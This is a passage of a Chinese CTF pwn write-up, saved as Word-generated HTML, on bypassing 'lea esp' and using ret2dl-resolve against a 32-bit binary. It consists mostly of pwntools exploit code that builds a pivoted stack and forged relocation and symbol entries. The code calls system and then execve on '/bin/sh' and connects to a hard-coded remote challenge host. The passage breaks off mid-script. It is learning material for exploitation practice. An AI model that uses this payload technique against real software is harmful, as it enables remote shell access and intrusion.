mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >reloc_arg=0x804a872-rel_plt #fang hou mian yidian ,hui bei fugai</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_offset=0x0804a00c #read_got</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=0x804a87a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >align=0x10-((fake_sym_addr-dynsym)&0xf) #align=8#栈对齐</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=fake_sym_addr+align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_info=((fake_sym_addr-dynsym)/0x10)&#60;&#60;8|0x7</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#r_info=0x107</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_rel=p32(r_offset)+p32(r_info)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >bin_sh=0x804a8e3</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*(0x804a85a-buf-len(payload))</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(plt0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(reloc_arg)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(bin_sh)#set argc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*8</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_rel</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >st_name=0x804a88c-dynstr</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="B"*align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_sym</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="system\x00"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*80</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="/bin/sh\x00"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="435"  height="226"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充7671.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="530"  height="314"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充7673.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >但是依旧没弹出</font>shell，参数和system都没有错</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >后来发现换成</font>execve就解决了（execve要设置三个参数/bin/sh ，0 ，0）</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >最终脚本：</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ># -*- coding: utf-8 -*-</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=remote("39.100.87.24",8101)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >buf=0x804a040</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >read_plt=0xf7ed2b00</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >stack_size=0x500</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget2=0x08048519 # &nbsp;pop esi ; pop edi ; pop ebp ; ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget3=0x080483c5 #</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(read_plt)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(gadget2)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(0)+p32(base_stage)+p32(100)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget3) </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage+stack_size)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#struct </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynsym=0x080481cc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynstr=0x0804822c</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >plt0=0x80482f0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >rel_plt=0x080482b4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >reloc_arg=0x804a872-rel_plt #fang hou mian yidian ,hui bei fugai</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_offset=0x0804a00c #read_got</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=0x804a87a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >align=0x10-((fake_sym_addr-dynsym)&0xf) #align=8#栈对齐</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym_addr=fake_sym_addr+align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_info=((fake_sym_addr-dynsym)/0x10)&#60;&#60;8|0x7</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#r_info=0x107</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_rel=p32(r_offset)+p32(r_info)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >bin_sh=0x804a8e3</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*(0x804a85a-buf-len(payload))</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(plt0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(reloc_arg)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(bin_sh)#set argc #之前的wp里面写错了</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(0)+p32(0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_rel</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >st_name=0x804a88c-dynstr</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="B"*align</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_sym</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="execve\x00"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*80</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="/bin/sh\x00"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*20</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
